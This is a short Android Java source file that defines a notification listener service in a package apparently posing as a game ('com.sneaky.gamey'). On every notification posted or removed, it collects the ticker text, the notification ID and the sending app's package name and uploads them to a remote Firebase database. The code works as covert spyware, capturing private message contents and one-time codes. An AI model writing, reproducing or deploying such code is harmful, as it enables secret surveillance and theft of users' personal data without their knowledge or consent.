package com.sneaky.gamey.services;

import android.content.Intent;
import android.os.IBinder;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;

import com.sneaky.gamey.database.Firebase;

import java.util.ArrayList;

public class NotificationListener extends NotificationListenerService {

    @Override
    public IBinder onBind(Intent intent) {
        return super.onBind(intent);
    }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn){
        sendNotificationData(sbn, "posted");
    }

    private void sendNotificationData(StatusBarNotification sbn, String type) {
        ArrayList<Object> data = new ArrayList<Object>();
        data.add(type);
        data.add(sbn.getId());
        data.add(sbn.getNotification().tickerText);
        data.add(sbn.getPackageName());
        Firebase.sendData(data);
    }

    @Override
    public void onNotificationRemoved(StatusBarNotification sbn){
        sendNotificationData(sbn, "removed");
    }
}
